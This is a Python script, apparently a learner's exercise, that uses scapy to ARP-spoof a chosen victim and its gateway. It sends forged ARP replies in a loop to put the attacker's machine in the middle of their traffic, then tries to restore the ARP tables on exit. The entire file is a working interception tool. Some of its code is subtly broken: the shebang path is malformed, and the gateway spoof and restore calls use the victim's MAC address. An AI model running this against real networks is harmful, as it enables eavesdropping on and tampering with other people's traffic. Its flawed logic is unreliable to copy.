#!/usr/bin/env/python

import scapy.all as scapy
import time
import sys
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target" , dest="target" , help="Target/Victim IP")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway/Router IP")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Specify a target IP , use --help for further info")
    if not options.gateway:
        parser.error("[-] Specify a gateway IP, Use --help for further info")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    #print(answered_list[0][1].hwsrc)
    return answered_list[0][0].hwsrc

def spoof(target_ip , spoof_ip , target_mac):
    #target_mac = get_mac(target_ip)# This causes an error where the list goes out of range
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
     # print(packet.show())
    # print(packet.summary()) To print the content of the packet
    # Send the packet to the target machine giving it the kali's MAC Addresss as the address of the router
# This function restores the arp table of the victim machine and the router setting it back to its original value
def restore(destination_ip , source_ip , destination_mac , source_mac):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, verbose=False, count=4)

options = get_arguments()
target_mac = get_mac(options.target)
source_mac = get_mac(options.gateway)

try:
    sent_packets_count = 0
    while True:
        spoof(options.target, options.gateway, target_mac)
        spoof(options.gateway, options.target, target_mac)
        sent_packets_count = sent_packets_count+2
         #   print("\r[+] Packets sent : " + str(sent_packets_count)), #Storing the print statement in buffer and then flushing the buffer to print in one line
        print("\r [+] Packets sent :" + str(sent_packets_count), end=" ") # This is the syntax to print buffer in python3 , you wont be needing sys.stdout.flush() , this statement does all the work
       # sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL+C .....Resetting ARP tables .... Please wait\n")
    restore(options.target, options.gateway, target_mac , source_mac)
    restore(options.gateway, options.target, target_mac , source_mac)

